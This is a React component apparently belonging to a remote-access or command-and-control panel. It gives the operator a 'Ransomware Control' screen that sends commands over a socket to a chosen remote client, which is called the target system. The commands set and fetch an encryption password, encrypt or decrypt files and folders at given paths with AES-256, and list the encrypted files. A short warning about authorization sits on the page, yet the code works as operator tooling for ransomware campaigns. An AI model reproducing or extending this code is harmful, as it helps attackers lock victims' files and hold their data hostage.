import React, { useState } from 'react';
import styled from 'styled-components';
import { 
  FiShield, 
  FiLock, 
  FiUnlock, 
  FiKey, 
  FiFile,
  FiFolder,
  FiAlertTriangle,
  FiCheckCircle,
  FiList,
  FiEye,
  FiEyeOff
} from 'react-icons/fi';
import { toast } from 'react-toastify';

const RansomwareContainer = styled.div`
  background: #0a0a0a;
  border-radius: 12px;
  border: 1px solid #333;
  height: calc(100vh - 140px);
  display: flex;
  flex-direction: column;
  overflow: hidden;
`;

const Header = styled.div`
  background: linear-gradient(90deg, #1a1a1a 0%, #2d2d2d 100%);
  border-bottom: 1px solid #333;
  padding: 16px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
`;

const Title = styled.h1`
  font-size: 20px;
  font-weight: 600;
  color: #fff;
  display: flex;
  align-items: center;
  gap: 12px;
`;

const Content = styled.div`
  flex: 1;
  padding: 20px;
  overflow-y: auto;
`;

const WarningCard = styled.div`
  background: linear-gradient(135deg, #2d1b1b 0%, #1a0f0f 100%);
  border: 1px solid #dc3545;
  border-radius: 12px;
  padding: 20px;
  margin-bottom: 20px;
`;

const WarningTitle = styled.h3`
  color: #dc3545;
  font-size: 18px;
  margin-bottom: 12px;
  display: flex;
  align-items: center;
  gap: 8px;
`;

const WarningText = styled.p`
  color: #ff6b6b;
  line-height: 1.6;
  margin-bottom: 16px;
`;

const PasswordSection = styled.div`
  background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
  border-radius: 12px;
  padding: 24px;
  margin-bottom: 20px;
  border: 1px solid #333;
`;

const SectionTitle = styled.h3`
  color: #fff;
  font-size: 18px;
  margin-bottom: 16px;
  display: flex;
  align-items: center;
  gap: 8px;
`;

const PasswordInput = styled.input`
  background: #0a0a0a;
  border: 1px solid #333;
  color: #fff;
  padding: 12px 16px;
  border-radius: 8px;
  font-size: 14px;
  width: 100%;
  margin-bottom: 12px;
  outline: none;
  transition: border-color 0.2s;

  &:focus {
    border-color: #00ff88;
  }

  &::placeholder {
    color: #666;
  }
`;

const ActionButton = styled.button`
  background: linear-gradient(135deg, #00ff88, #00cc6a);
  border: none;
  color: #000;
  padding: 12px 20px;
  border-radius: 8px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  font-weight: 600;
  transition: all 0.2s;
  margin-right: 12px;

  &:hover {
    transform: translateY(-1px);
    box-shadow: 0 4px 12px rgba(0, 255, 136, 0.3);
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
    transform: none;
  }

  &.danger {
    background: linear-gradient(135deg, #dc3545, #c82333);
    color: #fff;

    &:hover {
      box-shadow: 0 4px 12px rgba(220, 53, 69, 0.3);
    }
  }

  &.warning {
    background: linear-gradient(135deg, #ffc107, #e0a800);
    color: #000;

    &:hover {
      box-shadow: 0 4px 12px rgba(255, 193, 7, 0.3);
    }
  }
`;

const OperationsGrid = styled.div`
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
  gap: 20px;
  margin-bottom: 30px;
`;

const OperationCard = styled.div`
  background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
  border-radius: 12px;
  padding: 20px;
  border: 1px solid #333;
  transition: all 0.2s;

  &:hover {
    border-color: #00ff88;
    transform: translateY(-2px);
  }
`;

const OperationHeader = styled.div`
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 12px;
`;

const OperationIcon = styled.div`
  width: 40px;
  height: 40px;
  background: ${props => props.color || 'linear-gradient(135deg, #00ff88, #00cc6a)'};
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #000;
  font-size: 18px;
`;

const OperationTitle = styled.h4`
  color: #fff;
  font-size: 16px;
  margin: 0;
`;

const OperationDescription = styled.p`
  color: #888;
  font-size: 14px;
  margin-bottom: 16px;
`;

const PathInput = styled.input`
  background: #0a0a0a;
  border: 1px solid #333;
  color: #fff;
  padding: 10px 12px;
  border-radius: 6px;
  font-size: 14px;
  width: 100%;
  margin-bottom: 12px;
  outline: none;
  transition: border-color 0.2s;

  &:focus {
    border-color: #00ff88;
  }

  &::placeholder {
    color: #666;
  }
`;

const StatusSection = styled.div`
  background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
  border-radius: 12px;
  padding: 20px;
  border: 1px solid #333;
`;

const StatusItem = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 12px 0;
  border-bottom: 1px solid #333;

  &:last-child {
    border-bottom: none;
  }
`;

const StatusLabel = styled.div`
  color: #ccc;
  font-size: 14px;
`;

const StatusValue = styled.div`
  color: #fff;
  font-weight: 500;
`;

const Ransomware = ({ client, socket }) => {
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [encryptPath, setEncryptPath] = useState('');
  const [decryptPath, setDecryptPath] = useState('');
  const [encryptedFiles, setEncryptedFiles] = useState([]);

  const handleSetPassword = () => {
    if (!client || !socket || !password.trim()) return;

    socket.emit('executeCommand', {
      clientId: client.id,
      command: `setpass ${password}`
    });
    toast.success('Password set successfully');
  };

  const handleGetPassword = () => {
    if (!client || !socket) return;

    socket.emit('executeCommand', {
      clientId: client.id,
      command: 'getpass'
    });
  };

  const handleEncrypt = () => {
    if (!client || !socket || !encryptPath.trim()) return;

    socket.emit('executeCommand', {
      clientId: client.id,
      command: `encrypt ${encryptPath}`
    });
    toast.success(`Encrypting ${encryptPath}...`);
  };

  const handleDecrypt = () => {
    if (!client || !socket || !decryptPath.trim()) return;

    socket.emit('executeCommand', {
      clientId: client.id,
      command: `decrypt ${decryptPath}`
    });
    toast.success(`Decrypting ${decryptPath}...`);
  };

  const handleListEncrypted = () => {
    if (!client || !socket) return;

    socket.emit('executeCommand', {
      clientId: client.id,
      command: 'listencrypted'
    });
  };

  if (!client) {
    return (
      <RansomwareContainer>
        <div style={{ 
          display: 'flex', 
          alignItems: 'center', 
          justifyContent: 'center', 
          height: '100%',
          color: '#666',
          fontSize: '16px'
        }}>
          Select a client to manage ransomware operations
        </div>
      </RansomwareContainer>
    );
  }

  return (
    <RansomwareContainer>
      <Header>
        <Title>
          <FiShield />
          Ransomware Control
        </Title>
      </Header>

      <Content>
        <WarningCard>
          <WarningTitle>
            <FiAlertTriangle />
            WARNING - DANGEROUS OPERATION
          </WarningTitle>
          <WarningText>
            This tool can encrypt and decrypt files on the target system. 
            Use with extreme caution. Encrypted files cannot be recovered 
            without the correct password. Ensure you have proper authorization 
            before proceeding.
          </WarningText>
        </WarningCard>

        <PasswordSection>
          <SectionTitle>
            <FiKey />
            Password Management
          </SectionTitle>
          <PasswordInput
            type={showPassword ? 'text' : 'password'}
            placeholder="Enter encryption password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <div style={{ display: 'flex', gap: '12px', marginBottom: '12px' }}>
            <ActionButton onClick={handleSetPassword} disabled={!password.trim()}>
              <FiLock />
              Set Password
            </ActionButton>
            <ActionButton onClick={handleGetPassword}>
              <FiUnlock />
              Get Password
            </ActionButton>
            <ActionButton 
              onClick={() => setShowPassword(!showPassword)}
              style={{ background: 'rgba(255, 255, 255, 0.1)', color: '#fff' }}
            >
              {showPassword ? <FiEyeOff /> : <FiEye />}
              {showPassword ? 'Hide' : 'Show'}
            </ActionButton>
          </div>
        </PasswordSection>

        <OperationsGrid>
          <OperationCard>
            <OperationHeader>
              <OperationIcon color="linear-gradient(135deg, #dc3545, #c82333)">
                <FiLock />
              </OperationIcon>
              <OperationTitle>Encrypt Files</OperationTitle>
            </OperationHeader>
            <OperationDescription>
              Encrypt files or directories using AES-256 encryption. 
              Files will be renamed with .encrypted extension.
            </OperationDescription>
            <PathInput
              placeholder="Enter file or directory path to encrypt"
              value={encryptPath}
              onChange={(e) => setEncryptPath(e.target.value)}
            />
            <ActionButton 
              onClick={handleEncrypt} 
              disabled={!encryptPath.trim()}
              className="danger"
            >
              <FiLock />
              Encrypt
            </ActionButton>
          </OperationCard>

          <OperationCard>
            <OperationHeader>
              <OperationIcon color="linear-gradient(135deg, #28a745, #1e7e34)">
                <FiUnlock />
              </OperationIcon>
              <OperationTitle>Decrypt Files</OperationTitle>
            </OperationHeader>
            <OperationDescription>
              Decrypt previously encrypted files using the current password. 
              Original files will be restored.
            </OperationDescription>
            <PathInput
              placeholder="Enter encrypted file or directory path"
              value={decryptPath}
              onChange={(e) => setDecryptPath(e.target.value)}
            />
            <ActionButton 
              onClick={handleDecrypt} 
              disabled={!decryptPath.trim()}
              className="warning"
            >
              <FiUnlock />
              Decrypt
            </ActionButton>
          </OperationCard>
        </OperationsGrid>

        <StatusSection>
          <SectionTitle>
            <FiList />
            Encrypted Files Status
          </SectionTitle>
          <StatusItem>
            <StatusLabel>Current Password</StatusLabel>
            <StatusValue>{password ? 'Set' : 'Not Set'}</StatusValue>
          </StatusItem>
          <StatusItem>
            <StatusLabel>Encrypted Files</StatusLabel>
            <StatusValue>{encryptedFiles.length}</StatusValue>
          </StatusItem>
          <StatusItem>
            <StatusLabel>Last Operation</StatusLabel>
            <StatusValue>None</StatusValue>
          </StatusItem>
          <div style={{ marginTop: '16px' }}>
            <ActionButton onClick={handleListEncrypted}>
              <FiList />
              List Encrypted Files
            </ActionButton>
          </div>
        </StatusSection>
      </Content>
    </RansomwareContainer>
  );
};

export default Ransomware;